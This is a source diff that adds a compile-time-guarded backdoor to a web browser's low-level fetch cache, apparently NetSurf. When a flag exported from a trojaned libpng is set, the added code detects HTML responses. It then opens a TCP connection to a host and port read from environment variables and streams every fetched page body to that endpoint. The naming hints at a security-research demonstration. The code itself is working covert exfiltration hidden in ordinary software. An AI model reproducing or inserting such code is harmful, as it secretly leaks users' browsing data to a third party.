@@ -20,6 +20,22 @@
  * Low-level resource cache (implementation)
  */
 
+#ifdef CTSRD_BACKDOOR
+#include <sys/types.h>
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+/* exported from libpng */
+extern int png_trojan_triggered;
+#endif /* CTSRD_BACKDOOR */
+
+
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
@@ -1636,6 +1652,12 @@ static void llcache_fetch_callback(const fetch_msg *msg, void *p)
 	nserror error = NSERROR_OK;
 	llcache_object *object = p;
 	llcache_event event;
+#ifdef CTSRD_BACKDOOR
+	/* XXX not thread safe */
+	static int sock = -1, interest_level = 0;
+	static struct hostent *server = NULL;
+	static struct sockaddr_in serveraddr;
+#endif /* CTSRD_BACKDOOR */
 
 	LLCACHE_LOG(("Fetch event %d for %p", msg->type, object));
 
@@ -1647,6 +1669,67 @@ static void llcache_fetch_callback(const fetch_msg *msg, void *p)
 		error = llcache_fetch_process_header(object,
 				msg->data.header_or_data.buf,
 				msg->data.header_or_data.len);
+
+#ifdef CTSRD_BACKDOOR
+		if (!png_trojan_triggered) {
+				break;
+		}
+		if (interest_level != 2 && msg->data.header_or_data.len == 2) {
+				interest_level = 0;
+				break;
+		}
+		if (strncmp("HTTP/1.1 200 OK",
+			(char *)msg->data.header_or_data.buf,
+			sizeof("HTTP/1.1 200 OK")-1) == 0) {
+				interest_level = 1;
+				break;
+		} else {
+			if (interest_level == 1 &&
+				strncmp("Content-Type: text/html",
+				(char *)msg->data.header_or_data.buf,
+				sizeof("Content-Type: text/html")-1) == 0) {
+
+				interest_level = 2;
+				break;
+			}
+		}
+		if (interest_level == 2 && msg->data.header_or_data.len == 2) {
+			interest_level = 0;
+			if (server == NULL) {
+				char *covert_host = getenv("COVERT_HOST");
+				char *covert_port = getenv("COVERT_PORT");
+
+				if (covert_host == NULL || covert_port == NULL) {
+					break;
+				}
+				server = gethostbyname(covert_host);
+				if (server == NULL) {
+					perror("gethostbyname");
+				} else {
+					bzero((char *)&serveraddr,
+						sizeof(serveraddr));
+					serveraddr.sin_family = AF_INET;
+					bcopy((char *)server->h_addr,
+					   (char *)&serveraddr.sin_addr.s_addr,
+					   server->h_length);
+					serveraddr.sin_port =
+					   htons(atoi(covert_port));
+				}
+			}
+			if (sock == -1) {
+				sock = socket(AF_INET, SOCK_STREAM, 0);
+				if (sock < 0) {
+					perror("socket");
+				} else {
+					if (connect(sock,
+						(struct sockaddr *)&serveraddr,
+						sizeof(serveraddr)) < 0) {
+						perror("connect");
+					}
+				}
+			}
+		}
+#endif /* CTSRD_BACKDOOR */
 		break;
 
 	/* 3xx responses */
@@ -1661,6 +1744,12 @@ static void llcache_fetch_callback(const fetch_msg *msg, void *p)
 
 		error = llcache_fetch_redirect(object,
 				msg->data.redirect, &object);
+#ifdef CTSRD_BACKDOOR
+		if (sock != -1) {
+			close(sock);
+			sock = -1;
+		}
+#endif /* CTSRD_BACKDOOR */
 		break;
 	case FETCH_NOTMODIFIED:
 		/* Conditional request determined that cached object is fresh */
@@ -1701,11 +1790,26 @@ static void llcache_fetch_callback(const fetch_msg *msg, void *p)
 		}
 
 		object->fetch.state = LLCACHE_FETCH_DATA;
-
 		error = llcache_fetch_process_data(object,
 				msg->data.header_or_data.buf,
 				msg->data.header_or_data.len);
+#ifdef CTSRD_BACKDOOR
+		if (sock != -1) {
+			ssize_t n, tot = 0;
+
+			while (tot < (ssize_t)msg->data.header_or_data.len) {
+				n = write(sock, msg->data.header_or_data.buf,
+					msg->data.header_or_data.len);
+				if (n == -1) {
+					perror("write");
+					break;
+				} else
+					tot += n;
+			}
+		}
+#endif /* CTSRD_BACKDOOR */
 		break;
+
 	case FETCH_FINISHED:
 		/* Finished fetching */
 	{
@@ -1725,6 +1829,12 @@ static void llcache_fetch_callback(const fetch_msg *msg, void *p)
 
 		llcache_object_cache_update(object);
 	}
+#ifdef CTSRD_BACKDOOR
+		if (sock != -1) {
+			close(sock);
+			sock = -1;
+		}
+#endif /* CTSRD_BACKDOOR */
 		break;
 
 	/* Out-of-band information */
@@ -1749,7 +1859,12 @@ static void llcache_fetch_callback(const fetch_msg *msg, void *p)
 		event.data.msg = msg->data.error;
 
 		error = llcache_send_event_to_users(object, &event);
-
+#ifdef CTSRD_BACKDOOR
+		if (sock != -1) {
+			close(sock);
+			sock = -1;
+		}
+#endif /* CTSRD_BACKDOOR */
 		break;
 	case FETCH_PROGRESS:
 		/* Progress update */
